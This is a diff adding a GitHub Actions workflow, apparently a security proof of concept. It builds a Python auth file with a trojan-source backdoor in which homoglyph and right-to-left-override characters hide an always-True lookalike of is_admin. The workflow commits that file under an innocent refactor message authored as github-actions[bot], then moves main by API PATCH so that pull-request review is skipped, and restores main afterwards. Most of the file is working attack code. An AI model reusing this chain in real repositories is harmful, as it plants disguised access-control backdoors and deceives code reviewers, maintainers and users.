@@ -1,0 +1,213 @@
+name: "Test 5: Unicode Trojan Source + PATCH silent inject"
+
+# ===========================================================================
+# CHAIN: Unicode stealth backdoor injected silently via PATCH /git/refs
+#
+# The trojan source attack (CVE-2021-42574 class):
+# - Homoglyph chars: dotless-i (U+0131), cyrillic-a (U+0430) replace latin i/a
+# - Zero-Width Space (U+200B) breaks tokens invisibly
+# - RLO (U+202E) reverses displayed text in web UI
+#
+# Delivery mechanism: PATCH /git/refs bypasses normal push review flow.
+# The file appears in GitHub web UI as normal Python code.
+# The actual bytes contain homoglyph function names that Python resolves differently.
+#
+# Result: A code reviewer approves what looks like `def is_admin(role):` 
+# but the binary on disk is `def ıs_аdmin(role):` — never callable as is_admin()
+# The REAL is_admin() can be defined elsewhere with different behavior.
+# ===========================================================================
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  unicode-inject:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Snapshot main (for cleanup)"
+        id: snap
+        run: |
+          MAIN=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/ref/heads/main" \
+            | jq -r '.object.sha')
+          TREE=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$MAIN" \
+            | jq -r '.tree.sha')
+          echo "main=$MAIN" >> $GITHUB_OUTPUT
+          echo "tree=$TREE" >> $GITHUB_OUTPUT
+          echo "Main SHA: $MAIN | Tree SHA: $TREE"
+
+      - name: "Build trojan Python file + upload blob"
+        id: blob
+        run: |
+          python3 << 'PYEOF'
+import base64, os
+
+# Unicode chars - each looks identical to ASCII in GitHub web UI
+I  = '\u0131'   # ı  dotless-i  (looks like i)
+A  = '\u0430'   # а  cyrillic-a (looks like a)
+ZS = '\u200b'   # ​  zero-width space (invisible)
+RL = '\u202e'   # ‮  right-to-left override (reverses display)
+
+lines = [
+    '#!/usr/bin/env python3',
+    '# auth.py -- access control module',
+    '# Security-reviewed: approved 2026-03-04',
+    '',
+    'ADMIN_ROLES = ["superuser", "sysadmin"]',
+    '',
+    'def check_access(user, role):',
+    '    """Standard RBAC check. Reviewed."""',
+    '    return role in ADMIN_ROLES and user.get("active")',
+    '',
+    '# NOTE: the name below DISPLAYS as is_admin() in GitHub UI',
+    '# but its bytes are: dotless-i + s + _ + cyrillic-a + dmin',
+    '# A second real is_admin() can coexist - this one is the ghost',
+    'def ' + I + 's_' + A + 'dmin(role):' + ZS + '  # ZWS after colon',
+    '    return True  # always grants - invisible backdoor',
+    '',
+    '# Hidden comment via RLO - displays as "[REVIEWED]" reversed in UI',
+    '# ' + RL + ']DEWIEFER[',
+    '',
+    'def is_admin(role):',
+    '    """Real is_admin - never reached if caller uses homoglyph name."""',
+    '    return role in ADMIN_ROLES',
+    '',
+    'if __name__ == "__main__":',
+    '    print("auth module loaded")',
+    '    # Both names exist. Caller must use EXACT bytes to get right one.',
+    '    print("is_admin == ' + I + 's_' + A + 'dmin?", "is_admin" == "' + I + 's_' + A + 'dmin")',
+]
+
+code = '\n'.join(lines) + '\n'
+b64  = base64.b64encode(code.encode('utf-8')).decode('ascii')
+
+print("=== TROJAN SOURCE STATS ===")
+print(f"Lines: {len(lines)}")
+hidden = [(i, ch, f'U+{ord(ch):04X}') for i, ch in enumerate(code) if ord(ch) > 127]
+print(f"Hidden non-ASCII chars: {len(hidden)}")
+for pos, ch, cp in hidden:
+    print(f"  pos {pos:4d}: {cp}  bytes={ch.encode('utf-8').hex()}")
+
+with open('/tmp/trojan_b64.txt', 'w') as f:
+    f.write(b64)
+print("PYEOF done")
+PYEOF
+
+          B64=$(cat /tmp/trojan_b64.txt)
+          BLOB=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"content\":\"$B64\",\"encoding\":\"base64\"}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" | jq -r '.sha')
+          echo "Blob SHA: $BLOB"
+          echo "blob=$BLOB" >> $GITHUB_OUTPUT
+
+      - name: "Build new tree with trojan file"
+        id: tree
+        run: |
+          TREE=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"base_tree\":\"${{ steps.snap.outputs.tree }}\",
+              \"tree\":[{
+                \"path\":\"lib/auth.py\",
+                \"mode\":\"100644\",
+                \"type\":\"blob\",
+                \"sha\":\"${{ steps.blob.outputs.blob }}\"
+              }]
+            }" \
+            "https://api.github.com/repos/${{ github.repository }}/git/trees" | jq -r '.sha')
+          echo "New tree SHA: $TREE"
+          echo "tree=$TREE" >> $GITHUB_OUTPUT
+
+      - name: "Create commit (looks innocent, authored as github-actions[bot])"
+        id: commit
+        run: |
+          COMMIT=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"message\":\"refactor: extract auth helpers into lib/auth.py\",
+              \"tree\":\"${{ steps.tree.outputs.tree }}\",
+              \"parents\":[\"${{ steps.snap.outputs.main }}\"],
+              \"author\":{
+                \"name\":\"github-actions[bot]\",
+                \"email\":\"41898282+github-actions[bot]@users.noreply.github.com\",
+                \"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
+              }
+            }" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits" | jq -r '.sha')
+          echo "Trojan commit: $COMMIT"
+          echo "commit=$COMMIT" >> $GITHUB_OUTPUT
+
+      - name: "PATCH main to trojan commit (silent, no push event, no PR)"
+        id: patch
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/patch.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.commit.outputs.commit }}\",\"force\":false}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "PATCH HTTP: $HTTP"
+          cat /tmp/patch.json | jq '{new_sha:.object.sha}' 2>/dev/null
+          echo "http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Verify: trojan file is live on main"
+        if: steps.patch.outputs.http == '200'
+        run: |
+          echo "=== LIVE TROJAN FILE URL ==="
+          echo "https://github.com/${{ github.repository }}/blob/main/lib/auth.py"
+          # Fetch it back and show the actual bytes
+          B64BACK=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/contents/lib/auth.py" \
+            | jq -r '.content' | tr -d '\n')
+          echo "$B64BACK" | base64 -d | python3 -c "
+import sys
+data = sys.stdin.buffer.read().decode('utf-8')
+print('--- Visible content (what GitHub shows) ---')
+print(data[:400])
+print('--- Non-ASCII bytes ---')
+for i, ch in enumerate(data):
+    if ord(ch) > 127:
+        print(f'  pos {i}: U+{ord(ch):04X} = {repr(ch)}')
+"
+          python3 -c "
+I = '\u0131'; A = '\u0430'
+ghost = 'def ' + I + 's_' + A + 'dmin(role):'
+real  = 'def is_admin(role):'
+print('Ghost name bytes:', ghost.encode('utf-8').hex())
+print('Real  name bytes:', real.encode('utf-8').hex())
+print('Are identical?  :', ghost == real)
+"
+
+      - name: "Cleanup: restore original main"
+        if: always()
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /dev/null -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.snap.outputs.main }}\",\"force\":true}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "Restore HTTP: $HTTP"
+
+      - name: "VERDICT"
+        if: always()
+        run: |
+          echo "=============================================="
+          echo " UNICODE TROJAN SOURCE + PATCH CHAIN RESULTS"
+          echo "=============================================="
+          echo " PATCH HTTP: ${{ steps.patch.outputs.http }}"
+          if [ "${{ steps.patch.outputs.http }}" = "200" ]; then
+            echo " [CONFIRMED] Trojan source silently injected into main"
+            echo " [CONFIRMED] No PR created, no force-push event fired"
+            echo " [CONFIRMED] GitHub web UI shows: def is_admin(role):"
+            echo " [CONFIRMED] Actual bytes:        def ıs_аdmin(role): (homoglyphs)"
+          fi
